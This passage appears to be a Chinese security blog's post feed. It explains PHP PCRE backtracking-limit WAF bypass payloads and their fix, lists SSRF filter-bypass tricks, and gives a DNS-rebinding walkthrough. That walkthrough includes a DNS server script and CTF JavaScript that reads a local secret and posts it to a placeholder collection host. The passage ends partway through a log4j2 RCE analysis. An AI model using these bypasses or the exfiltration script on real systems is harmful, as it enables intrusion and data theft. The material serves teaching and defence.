<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@p0melo:/tmp<span class="comment"># cat 1.txt</span></span><br><span class="line">aaabbbccc</span><br><span class="line">root@p0melo:/tmp<span class="comment"># awk &#x27;sub(/aaa|aaabbb/,&quot;(replace)&quot;)&#x27; 1.txt</span></span><br><span class="line">(replace)ccc</span><br><span class="line">root@p0melo:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>所以说NFA是最左子式匹配，而DFA是最长左子式匹配。</p>
<p>针对第1和第3点递归和性能的影响，就不得不提到NFA匹配的回溯机制。</p>
<h2 id="贪婪模式与非贪婪模式"><a href="#贪婪模式与非贪婪模式" class="headerlink" title="贪婪模式与非贪婪模式"></a>贪婪模式与非贪婪模式</h2><p>正则表达式具有下面量词就是贪婪模式，在量词后面直接加上一个问号？就是非贪婪模式。</p>
<p>　　量词：{m,n}：m到n个</p>
<p>　　　　　*：任意多个</p>
<p>　　　　　+：一个到多个</p>
<p>　　　　　？：0或一个</p>
<p>这里我们举个贪婪模式的例子，表达式<code>/.*a/</code>与<code>aaabbb</code>匹配，由于是<strong>贪婪模式</strong>，<code>.*</code>会把aaabbb全部吃掉，然后再从最后一个b往回吐，一直吐到第3个a时匹配上了，所以返回aaa。我们可以通过<a class="link"   href="https://regex101.com/debugger" >在线工具<i class="fas fa-external-link-alt"></i></a>debug下匹配步骤，可以看到，第7步吐到了字符串第3个a的位置，第8步表达式最后一个a与字符串的第3个a匹配才配成功，表达式匹配完了也就停止了，所以匹配结果是aaa。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012163831932.png" class="" title="image-20211012163831932">

<p>并且会随着b的数量增多，吐（回溯）的次数也会增多。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164041139.png" class="" title="image-20211012164041139">

<p>再来看看<strong>非贪婪模式</strong>，正则改用<code>/.*?a/</code>，可以看到总共只需要匹配3步，在第1步<code>.*?</code>与字符串匹配时，由于是非贪婪模式，这里会把<code>.*?</code>放一放，优先用后面的表达式匹配，所以第2步表达式最后一个a与字符串第一个a匹配，匹配成功，然后往下匹配。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012164947050.png" class="" title="image-20211012164947050">

<p>第3步表达式结束符与字符串第2个a匹配不上，匹配结束，所以匹配结果为a。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211012170512722.png" class="" title="image-20211012170512722">

<p>当我们字符串改为<code>bbbbbbbbbbbbbbbbba</code>，可以看到匹配步数增加到了20次，这是因为<code>.*?</code>为非贪婪模式，所以优先由表达式中的a与字符串第一个字符b匹配，匹配不上，再由<code>.*?</code>匹配，由于非贪婪模式，又优先a与第二个b匹配，匹配失败……一直重复，直到表达式a与字符串最后一个a匹配上为止。</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013103334726.png" class="" title="image-20211013103334726">

<p>所以通过这个例子可以看出来，贪婪模式和非贪婪模式都会有回溯机制。</p>
<h2 id="回溯机制引发的问题"><a href="#回溯机制引发的问题" class="headerlink" title="回溯机制引发的问题"></a>回溯机制引发的问题</h2><p>上面例子的回溯次数会随着字符b的数量增加而增加，当回溯次数非常大时，就可能会导致拒绝服务攻击（redos），PHP给pcre设定了一个回溯次数上限pcre.backtrack_limit来防止redos问题。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(ini_get(<span class="string">&#x27;pcre.backtrack_limit&#x27;</span>));</span><br><span class="line"><span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;1000000&quot;</span></span><br></pre></td></tr></table></figure>

<p>当回溯次数大于1000000会有什么问题呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*a/s&#x27;</span>,<span class="string">&#x27;a&#x27;</span>.str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>)));  <span class="comment">// 贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(preg_match(<span class="string">&#x27;/.*?a/s&#x27;</span>,str_repeat(<span class="string">&#x27;b&#x27;</span>,<span class="number">1000000</span>).<span class="string">&#x27;a&#x27;</span>));  <span class="comment">// 非贪婪模式</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>

<p>这里返回了false，并非正常匹配上返回的1，不匹配返回的0，官方文档也对这现象做出了解释：</p>
<img src="/2021/10/12/PHP%E7%9A%84PCRE%E5%BA%93%E8%B4%AA%E5%A9%AA%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/image-20211013100741170.png" class="" title="image-20211013100741170">

<p>所以我们也可以通过该特性绕过一些限制，比如基于php的waf：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/SELECT.+FROM.+/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以输入类似<code>SELECT * FROM XXX /*aaaaaaa......</code>的payload使回溯次数超过限制，从而返回false绕过if判断，类似还有非贪婪模式的错误用法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 可以使用<code>UNION/*aaaaa......*/SELECT</code>增加回溯次数来绕过限制。</p>
<p><strong>修复方法</strong></p>
<p>我们可以通过全等号来判断<code>preg_match</code>的返回值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>) === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://blog.csdn.net/liuxiao723846/article/details/83308081" >正则引擎：DFA与NFA<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/zpflwy1314/article/details/82665254" >DFA与NFA的比较<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" >PHP利用PCRE回溯次数限制绕过某些安全限制<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>SSRF绕过姿势汇总</title>
    <url>/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h2 id="1-符号绕过"><a href="#1-符号绕过" class="headerlink" title="1. @符号绕过"></a>1. @符号绕过</h2><p><code>http://www.baidu.com@10.10.10.10</code>与<code>http://10.10.10.10</code>请求是相同的</p>
<p>该请求得到的内容都是10.10.10.10的内容，此绕过同样在URL跳转绕过中适用。</p>
<h2 id="2-点分隔符替换"><a href="#2-点分隔符替换" class="headerlink" title="2. 点分隔符替换"></a>2. 点分隔符替换</h2><p>在浏览器中可以使用不同的分割符号来代替域名中的<code>.</code>分割，可以使用<code>。</code>、<code>｡</code>、<code>．</code>来代替：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://www。qq。com</span><br><span class="line">http://www｡qq｡com</span><br><span class="line">http://www．qq．com</span><br></pre></td></tr></table></figure>

<h2 id="3-本地回环地址"><a href="#3-本地回环地址" class="headerlink" title="3. 本地回环地址"></a>3. 本地回环地址</h2><p>127.0.0.1，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加<code>[]</code>)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1 </span><br><span class="line">http:&#x2F;&#x2F;localhost </span><br><span class="line">http:&#x2F;&#x2F;127.255.255.254 </span><br><span class="line">127.0.0.1 - 127.255.255.254 </span><br><span class="line">http:&#x2F;&#x2F;127.1 </span><br><span class="line">http:&#x2F;&#x2F;127.0.1 </span><br><span class="line">http:&#x2F;&#x2F;0:80</span><br></pre></td></tr></table></figure>

<p>IPV6</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:7f00:1] </span><br><span class="line">http:&#x2F;&#x2F;[::ffff:127.0.0.1] </span><br><span class="line">http:&#x2F;&#x2F;ip6-localhost</span><br><span class="line">http:&#x2F;&#x2F;0--1.ipv6-literal.net</span><br></pre></td></tr></table></figure>

<h2 id="4-DNS解析"><a href="#4-DNS解析" class="headerlink" title="4. DNS解析"></a>4. DNS解析</h2><p>配置域名的DNS解析到目标地址(A、cname等)，这里有几个配置解析到任意的地址的域名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup 127.0.0.1.nip.io</span><br><span class="line"></span><br><span class="line">nslookup owasp.org.127.0.0.1.nip.io</span><br></pre></td></tr></table></figure>

<p>xip.io是一个开源泛域名服务。它会把如下的域名解析到特定的地址，其实和dns解析绕过一个道理。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">www.10.0.0.1.xip.io= 10.0.0.1</span><br><span class="line">http://mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">foo.http://bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">10.0.0.1.xip.name resolves to 10.0.0.1</span><br><span class="line">www.10.0.0.2.xip.name resolves to 10.0.0.2</span><br><span class="line">foo.10.0.0.3.xip.name resolves to 10.0.0.3</span><br><span class="line">bar.baz.10.0.0.4.xip.name resolves to 10.0.0.4</span><br></pre></td></tr></table></figure>

<h2 id="5-IP的进制转换"><a href="#5-IP的进制转换" class="headerlink" title="5. IP的进制转换"></a>5. IP的进制转换</h2><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。 <a class="link"   href="https://github.com/vysecurity/IPFuscator" >IPFuscator<i class="fas fa-external-link-alt"></i></a> 工具可实现IP地址的进制转换，包括了八进制、十进制、十六进制、混合进制。在这个工具的基础上添加了IPV6的转换和版本输出的优化。</p>
<h2 id="6-封闭式字母数字-Enclosed-Alphanumerics-字符"><a href="#6-封闭式字母数字-Enclosed-Alphanumerics-字符" class="headerlink" title="6. 封闭式字母数字 (Enclosed Alphanumerics)字符"></a>6. 封闭式字母数字 (Enclosed Alphanumerics)字符</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>

<h2 id="7-利用网址缩短"><a href="#7-利用网址缩短" class="headerlink" title="7. 利用网址缩短"></a>7. 利用网址缩短</h2><p>网上有很多将网址转换未短网址的网站。</p>
<ul>
<li><p><a class="link"   href="https://www.985.so/" >https://www.985.so/<i class="fas fa-external-link-alt"></i></a></p>
</li>
<li><p><a class="link"   href="https://www.urlc.cn/" >https://www.urlc.cn/<i class="fas fa-external-link-alt"></i></a></p>
</li>
</ul>
<h2 id="8-利用30X重定向"><a href="#8-利用30X重定向" class="headerlink" title="8. 利用30X重定向"></a>8. 利用30X重定向</h2><p>可以使用重定向来让服务器访问目标地址，可用于重定向的HTTP状态码：300、301、302、303、305、307、308。</p>
<p>需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</p>
<p>服务端代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&quot;Location: http://192.168.1.10&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-DNS重绑定-DNS-Rebinding"><a href="#9-DNS重绑定-DNS-Rebinding" class="headerlink" title="9. DNS重绑定(DNS Rebinding)"></a>9. DNS重绑定(DNS Rebinding)</h2><p>通常我们通过域名访问应用的流程是：浏览器向DNS服务器发送请求，DNS服务器将请求的域名转换为ip地址，然后向对应的IP地址请求资源，最后回显给用户。</p>
<p>在访问DNS后请求方会缓存域名和IP的对应关系，而缓存时间就是由DNS服务器设置的TTL值决定。</p>
<p>当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改通过某种方式对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址，对于浏览器来说前后2次访问是同一域名，所以认为是安全的，这就可导致绕过同源策略和SSRF限制。下面介绍3种常见的DNS从绑定方法。</p>
<h3 id="9-1-TTL-0的A记录"><a href="#9-1-TTL-0的A记录" class="headerlink" title="9.1 TTL=0的A记录"></a>9.1 TTL=0的A记录</h3><p>国内的域名厂商基本都不可以设置TTL为0，某些国外的域名才可以设置TTL=0，这方法只适用于前后两次请求存在一定有时间间隔或时间可控的情况。</p>
<p>举个CTF例子，你能向服务器提交一个URL,并且服务器会访问你提交的url。然后flag藏在服务器的本身的<code>http://127.0.0.1/secret</code>上。只能本地访问。</p>
<p>但是这里你提交你能控制的页面<code>www.x.com/index.php</code>，但是由于同源策略的原因你没办法去获取服务器上的<code>http://127.0.0.1/secret</code>。 但是通过<code>dns rebinding</code>就可以了。 比如你的页面如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://*********/static/jquery.min.js</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="string">&quot;POST()&quot;</span>,<span class="number">90000</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">POST</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">    alert();</span><br><span class="line"><span class="javascript">    $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">    url:<span class="string">&quot;http://www.x.com/secret&quot;</span>,</span></span><br><span class="line"><span class="javascript">    type:<span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="javascript">    success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.post(<span class="string">&quot;http://xss平台&quot;</span>,&#123;<span class="string">&#x27;a&#x27;</span>:data&#125;)&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>整个过程如下：</p>
<ol>
<li>你提交的是<code>www.x.com/index.php</code>，内容如上述代码</li>
<li>设置你的域名的TTL=0，提交之后服务器会请求dns的域名与ip的关系然后找到你的这个页面，然后开始执行js。</li>
<li>执行的时候先延迟90s，利用这延迟的90s，去修改你域名的A记录绑定到127.0.0.1上</li>
<li>然后js延迟结束之后之后又会请求<code>http://www.x.com/secret</code>，由于你之前设置的TTL=0，所以又会重新向dns服务器请求一次ip。得到ip=127.0.0.1，而整个过程访问的都是同一域名，所以浏览器认为是安全的。就会成功去访问<code>http://127.0.0.1/secret</code>，从而绕过同源策略</li>
</ol>
<h3 id="9-2-两条A记录"><a href="#9-2-两条A记录" class="headerlink" title="9.2 两条A记录"></a>9.2 两条A记录</h3><p>域名解析配置2条A记录，一条为外网的VPS IP，一条为内网IP，就<a class="link"   href="http://www.bendawang.site/2017/01/05/33c3-CTF-web-WriteUp/" >33c3-CTF list0r<i class="fas fa-external-link-alt"></i></a>这题而言，服务器会向DNS服务器连续访问2次请求，第一次判断解析后的IP是否在黑名单IP(本地IP)中，第二次就直接访问域名，所以需要第一次解析为外网地址，第二次解析为127.0.0.1，这种情况就可以采用此方法。DNS服务器绑定2条记录的解析是随机的，所以成功率只有1/4。</p>
<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/586e317cb6a56d3762000002.png" class="" title="img">

<h3 id="9-3-NS记录-自建DNS服务器"><a href="#9-3-NS记录-自建DNS服务器" class="headerlink" title="9.3 NS记录+自建DNS服务器"></a>9.3 NS记录+自建DNS服务器</h3><p>此方法需要再我们DNS解析配置一条NS记录和一条A记录</p>
<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161403319.png" class="" title="image-20220112161403319">

<p>ns记录表示域名<code>test.p0melo.top</code>这个子域名指定由<code>ns.p0melo.top</code>这个域名服务器来解析，然后a记录表示我的这个<code>ns.p0melo.top</code>的位置在ip地址<code>149.248.18.38</code>上。然后我们用python的twisted库搭建一个DNS服务器就可以了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord&#x3D;&#123;&#125;class DynamicResolver(object):    def _doDynamicResponse(self, query):        name &#x3D; query.name.name        if name not in record or record[name]&lt;1:            ip&#x3D;&quot;149.248.18.38&quot;        else:            ip&#x3D;&quot;127.0.0.1&quot;        if name not in record:            record[name]&#x3D;0        record[name]+&#x3D;1        print name+&quot; &#x3D;&#x3D;&#x3D;&gt; &quot;+ip        answer &#x3D; dns.RRHeader(            name&#x3D;name,            type&#x3D;dns.A,            cls&#x3D;dns.IN,            ttl&#x3D;0,            payload&#x3D;dns.Record_A(address&#x3D;b&#39;%s&#39;%ip,ttl&#x3D;0)        )        answers &#x3D; [answer]        authority &#x3D; []        additional &#x3D; []        return answers, authority, additional    def query(self, query, timeout&#x3D;None):        return defer.succeed(self._doDynamicResponse(query))def main():    factory &#x3D; server.DNSServerFactory(        clients&#x3D;[DynamicResolver(), client.Resolver(resolv&#x3D;&#39;&#x2F;etc&#x2F;resolv.conf&#39;)]    )    protocol &#x3D; dns.DNSDatagramProtocol(controller&#x3D;factory)    reactor.listenUDP(53, protocol)    reactor.run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    raise SystemExit(main())</span><br></pre></td></tr></table></figure>

<p>我们使用<code>nslookup test.p0melo.top</code>查看解析结果，可以看到前后两次DNS解析不同</p>
<img src="/2022/01/12/SSRF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB/image-20220112161740821.png" class="" title="image-20220112161740821">

<p><strong>参考链接</strong></p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/VvXCTNZhfknKNlcUdMzGBA" >SSRF防御与绕过<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" >关于DNS重绑定总结<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>log4j2 RCE分析与复现</title>
    <url>/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>去年12月份爆出了<code>log4j2 RCE</code>的漏洞（<code>CVE-2021-44228</code>），该漏洞利用难度低，危害大，且影响范围广泛，这将有可能是载入安全史册的漏洞，作为史诗级漏洞的见证者，写个漏洞分析留个底还是有必要的:smile:</p>
<h2 id="0x00-漏洞复现"><a href="#0x00-漏洞复现" class="headerlink" title="0x00 漏洞复现"></a>0x00 漏洞复现</h2><p>复现比较简单，先引入<code>log4j</code> 版本<code>2.14.1</code>的包，我这里配的是<code>lombok</code>+<code>sprint-boot-starter-log4j2</code>，<code>starter 2.5.7</code>依赖的是<code>2.14.1</code>版本的log4j</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123122258173.png" class="" title="image-20220123122258173">

<p>或者换做直接引<code>log4j</code>的包也是OK的。</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219150315768.png" class="" title="image-20220219150315768">

<p>通过JNDI注入利用<a class="link"   href="https://github.com/welk1n/JNDI-Injection-Exploit" >工具<i class="fas fa-external-link-alt"></i></a>在本地启动JNDI服务，根据项目JDK版本在<code>log.error</code>中插入对应payload即可触发</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123155520880.png" class="" title="image-20220123155520880">

<h2 id="0x01-代码分析"><a href="#0x01-代码分析" class="headerlink" title="0x01 代码分析"></a>0x01 代码分析</h2><h3 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h3><p>跟入error方法，在<code>AbstractLogger</code>类的<code>logIfEnabled</code>方法中进行一层判断，满足了配置的log等级才输出日志</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isEnabled(level, marker, message)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logMessage(fqcn, level, marker, message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟到<code>isEnabled</code>方法下面看看是怎么判断，可以看到filter方法中302行会判断传入的level是否大于配置的level，调试等级从低到高是<code>All &lt; Trace &lt; Debug &lt; Info &lt; Warn &lt; Error &lt; Fatal &lt; OFF</code>，程序会打印高于或等于所设置级别的日志，而默认配置为<code>error</code>等级，这也就是为什么默认配置下<code>error</code>和<code>fatal</code>可以触发，而<code>debug/info/warn</code>触发不了的原因。</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123163628452.png" class="" title="image-20220123163628452">

<p>我们也可以通过修改log4j2.xml配置来配置日志输出等级</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220219145944559.png" class="" title="image-20220219145944559">

<p>接着从<code>logMessage</code>方法往下跟到<code>AbstractOutputStreamAppender</code>类的<code>directEncodeEvent</code>方法，89行跟入<code>encode</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">directEncodeEvent</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 跟入</span></span><br><span class="line">    <span class="keyword">this</span>.getLayout().encode(event, <span class="keyword">this</span>.manager);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.immediateFlush || event.isEndOfBatch()) &#123;</span><br><span class="line">        <span class="keyword">this</span>.manager.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>PatternLayout</code>类实现<code>encode</code>方法，接着关注<code>toText</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">encode</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> ByteBufferDestination destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(<span class="keyword">this</span>.eventSerializer <span class="keyword">instanceof</span> Serializer2)) &#123;</span><br><span class="line">        <span class="keyword">super</span>.encode(event, destination);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 跟入toText方法</span></span><br><span class="line">        StringBuilder text = <span class="keyword">this</span>.toText((Serializer2)<span class="keyword">this</span>.eventSerializer, event, getStringBuilder());</span><br><span class="line">        Encoder&lt;StringBuilder&gt; encoder = <span class="keyword">this</span>.getStringBuilderEncoder();</span><br><span class="line">        encoder.encode(text, destination);</span><br><span class="line">        trimToMaxSize(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> StringBuilder <span class="title">toText</span><span class="params">(<span class="keyword">final</span> Serializer2 serializer, <span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder destination)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> serializer.toSerializable(event, destination);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="消息格式化"><a href="#消息格式化" class="headerlink" title="消息格式化"></a>消息格式化</h3><p>跟入<code>toSerializable</code>方法，遍历类型为<code>org.apache.logging.log4j.core.pattern.PatternFormatter</code>类的<code>formatters</code>数组，调用其<code>format</code>方法，这里只需关注第8次循环的<code>format</code>方法，漏洞就是在这个<code>format</code>中触发</p>
<img src="/2022/01/22/log4j2-RCE%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/image-20220123174526935.png" class="" title="image-20220123174526935">

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.skipFormattingInfo) &#123;</span><br><span class="line">        <span class="comment">// 第8次循环的converter实现为MessagePatternConverter类，跟入</span></span><br><span class="line">        <span class="keyword">this</span>.converter.format(event, buf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.formatWithInfo(event, buf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看看<code>MessagePatternConverter</code>中的<code>format</code>实现，在判断log内容包含<code>$&#123;</code>后，将<code>evet</code>带入的<code>replace</code>方法</p>
